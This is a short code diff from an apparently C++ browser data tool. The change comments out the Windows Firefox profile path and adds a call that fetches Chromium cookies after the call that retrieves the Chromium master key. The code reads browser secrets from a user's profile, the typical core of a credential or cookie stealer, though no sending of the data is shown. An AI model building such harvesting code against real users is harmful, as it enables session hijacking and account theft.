@@ -12,16 +12,19 @@ int main()
 #if defined(__linux__)
         string firefox_pass_path="~/.mozilla/firefox/<profilename>";
 #elif defined(__WIN64__)
+        /*
         TCHAR username[255];
         DWORD username_len=255;
         GetUserName((TCHAR*)username, &username_len);
         string firefox_pass_path=_T("C:\\Users\\");
         firefox_pass_path += username;
         firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
+        */
 #endif
         ChromiumProcessor cProc1;
 
         cProc1.getMasterKey();
+        cProc1.getChromiumCookies();
 /*
         if(experimental::filesystem::exists(firefox_pass_path))
         {
